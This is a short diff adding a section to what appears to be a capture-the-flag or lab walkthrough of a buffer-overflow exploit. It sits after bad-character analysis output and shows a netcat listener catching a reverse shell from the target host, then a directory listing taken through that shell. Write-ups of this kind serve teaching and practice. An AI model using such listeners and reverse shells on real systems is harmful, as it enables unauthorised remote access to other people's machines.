@@ -256,3 +256,20 @@ First mismatching byte: 01
 Possibly bad chars: 01
 Bytes omitted from input: 00
 ```
+### Reverse shell initial connection:
+
+```
+┌──(hacktopuser㉿hacktop)-[~]
+└─$ nc -lnvp 7777              
+listening on [any] 7777 ...
+connect to [192.168.159.255] from (UNKNOWN) [10.49.167.39] 42024
+CMD Version 1.4.1
+
+Z:\home\puck>dir
+...
+  3/6/2013   3:23 PM           513  checksrv.sh
+  3/4/2013   2:45 PM  <DIR>         web
+       1 file                       513 bytes
+       3 directories     13,805,817,856 bytes free
+...
+```
